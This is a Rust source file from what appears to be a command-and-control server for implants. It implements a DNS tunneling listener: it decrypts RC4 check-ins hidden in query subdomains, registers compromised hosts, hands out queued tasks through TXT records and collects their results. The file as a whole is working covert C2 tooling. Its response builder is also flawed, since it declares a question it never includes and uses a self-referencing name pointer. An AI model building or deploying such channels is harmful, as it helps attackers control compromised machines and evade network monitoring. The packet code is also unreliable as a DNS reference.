use crate::core::events::Event;
use crate::protocol::crypto;
use crate::state::AppState;
use std::net::SocketAddr;
use tokio::net::UdpSocket;
use tracing::{error, info, warn};

const DNS_HEADER_LEN: usize = 12;
const MAX_UDP: usize = 512;

pub async fn start_dns_listener(
    state: AppState,
    bind: &str,
    port: u16,
    domain: &str,
    rc4_key: &[u8],
) -> Result<(), String> {
    let addr: SocketAddr = format!("{}:{}", bind, port)
        .parse()
        .map_err(|e| format!("invalid bind: {}", e))?;

    let socket = UdpSocket::bind(addr)
        .await
        .map_err(|e| format!("bind error: {}", e))?;

    info!("DNS listener on {} (domain: {})", addr, domain);

    let domain = domain.to_string();
    let rc4_key = rc4_key.to_vec();
    let mut buf = [0u8; MAX_UDP];

    loop {
        let (len, src) = match socket.recv_from(&mut buf).await {
            Ok(r) => r,
            Err(e) => {
                error!("dns recv error: {}", e);
                continue;
            }
        };

        if len < DNS_HEADER_LEN {
            continue;
        }

        let packet = &buf[..len];
        let tx_id = &packet[0..2];
        let qd_count = u16::from_be_bytes([packet[4], packet[5]]);

        if qd_count == 0 {
            continue;
        }

        if let Some(query_name) = parse_dns_name(packet, DNS_HEADER_LEN) {
            let lower = query_name.to_lowercase();
            if !lower.ends_with(&format!(".{}", domain.to_lowercase())) {
                continue;
            }

            let subdomain = &lower[..lower.len() - domain.len() - 1];
            let parts: Vec<&str> = subdomain.split('.').collect();

            if parts.len() >= 2 {
                let msg_type = parts[0];
                let hex_data: String = parts[1..].iter().copied().collect();

                if let Ok(encrypted) = hex::decode(&hex_data) {
                    let plaintext = crypto::decrypt(&encrypted, &rc4_key);

                    match msg_type {
                        "c" => {
                            if let Ok(checkin) = crate::protocol::wire::parse_checkin(&plaintext) {
                                let agent_hex = hex::encode(checkin.agent_id);
                                let _ = state.implants.handle_checkin(
                                    &checkin.agent_id,
                                    &checkin.hostname,
                                    checkin.sleep_ms,
                                    &src.ip().to_string(),
                                    &format!("dns://{}:{}", bind, port),
                                );
                                state.events.publish(
                                    Event::new("implant_checkin", &format!("DNS: {}", checkin.hostname))
                                        .with_agent(&agent_hex),
                                );

                                let tasks = state
                                    .tasks
                                    .drain_for_implant(&checkin.agent_id)
                                    .unwrap_or_default();
                                let task_list = crate::protocol::wire::serialize_task_list(&tasks);
                                let encrypted_resp = crypto::encrypt(&task_list, &rc4_key);
                                let hex_resp = hex::encode(&encrypted_resp);

                                let response = build_dns_txt_response(tx_id, &query_name, &hex_resp);
                                let _ = socket.send_to(&response, src).await;
                            }
                        }
                        "r" => {
                            if let Ok(result) = crate::protocol::wire::parse_result(&plaintext) {
                                let agent_hex = hex::encode(result.agent_id);
                                let _ = state.tasks.complete(
                                    result.task_id as i64,
                                    result.success,
                                    &result.output,
                                );
                                state.events.publish(
                                    Event::new("task_complete", &format!("DNS: success={}", result.success))
                                        .with_agent(&agent_hex)
                                        .with_task(result.task_id as i64),
                                );

                                let response = build_dns_txt_response(tx_id, &query_name, "ok");
                                let _ = socket.send_to(&response, src).await;
                            }
                        }
                        _ => {
                            warn!("unknown DNS msg type: {}", msg_type);
                        }
                    }
                }
            }
        }
    }
}

fn parse_dns_name(packet: &[u8], offset: usize) -> Option<String> {
    let mut pos = offset;
    let mut name = String::new();

    loop {
        if pos >= packet.len() {
            return None;
        }
        let len = packet[pos] as usize;
        if len == 0 {
            break;
        }
        if (len & 0xC0) == 0xC0 {
            break;
        }
        pos += 1;
        if pos + len > packet.len() {
            return None;
        }
        if !name.is_empty() {
            name.push('.');
        }
        name.push_str(&String::from_utf8_lossy(&packet[pos..pos + len]));
        pos += len;
    }
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

fn build_dns_txt_response(tx_id: &[u8], _query_name: &str, txt_data: &str) -> Vec<u8> {
    let mut resp = Vec::with_capacity(128);

    resp.extend_from_slice(tx_id);
    resp.extend_from_slice(&[0x81, 0x80]); // flags: response, no error
    resp.extend_from_slice(&[0x00, 0x01]); // questions: 1
    resp.extend_from_slice(&[0x00, 0x01]); // answers: 1
    resp.extend_from_slice(&[0x00, 0x00]); // authority: 0
    resp.extend_from_slice(&[0x00, 0x00]); // additional: 0

    resp.push(0xC0);
    resp.push(0x0C);
    resp.extend_from_slice(&[0x00, 0x10]); // type TXT
    resp.extend_from_slice(&[0x00, 0x01]); // class IN
    resp.extend_from_slice(&[0x00, 0x00, 0x00, 0x3C]); // TTL 60s

    let txt_bytes = txt_data.as_bytes();
    let mut txt_records = Vec::new();
    for chunk in txt_bytes.chunks(255) {
        txt_records.push(chunk.len() as u8);
        txt_records.extend_from_slice(chunk);
    }

    let rdlength = txt_records.len() as u16;
    resp.extend_from_slice(&rdlength.to_be_bytes());
    resp.extend_from_slice(&txt_records);

    resp
}
